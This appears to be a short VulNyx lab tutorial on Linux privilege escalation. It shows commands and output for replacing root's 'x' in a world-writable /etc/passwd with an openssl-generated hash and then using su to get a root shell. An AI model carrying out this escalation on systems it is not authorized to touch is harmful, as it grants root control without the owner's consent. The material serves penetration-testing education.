---
title: 🐧 Privilege Escalation (Linux)
date: 0003-01-01
layout: post
---

### /etc/passwd (Writable)

If a low-privileged user has permissions to write to the `/etc/passwd` file, an attacker can remove the `:x:` (on the `root` user line) and add a **hash**.  
This will change the file where a user's authentication is performed, from being done through the `/etc/shadow` file to being done through the `/etc/passwd` file.

##### Check Permissions

```ruby
low@vulnyx:~$ ls -l /etc/passwd
-rw----rw- 1 root root 1395 abr 21 20:16 /etc/passwd
```

##### Create Hash

```ruby
root@kali:~# openssl passwd -1 "P@ssword123"
$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0
```

##### Add Hash

```ruby
# before
low@vulnyx:~$ cat /etc/passwd |grep root
root:x:0:0:root:/root:/bin/bash

# after
low@vulnyx:~$ cat /etc/passwd |grep root
root:$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0:0:0:root:/root:/bin/bash
```

##### Authenticate

```ruby
low@vulnyx:~$ su -
Password:

root@vulnyx:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

---

#### Disclaimer

> ##### WARNING
> All techniques presented in this blog are for educational and ethical purposes.  
> The [VulNyx](https://vulnyx.com) team is not responsible for any misuse or damage caused to third party systems or infrastructure.
{: .block-warning }

<br><br>
<div style="display: flex; justify-content: center; align-items: center; width: 100%; margin-top: 20px;">
  <img src="/assets/gitbook/images/favicon.png" style="width: 30px; height: auto; margin-right: 6px;">
  <span>© VulNyx 2023-2025</span>
</div>
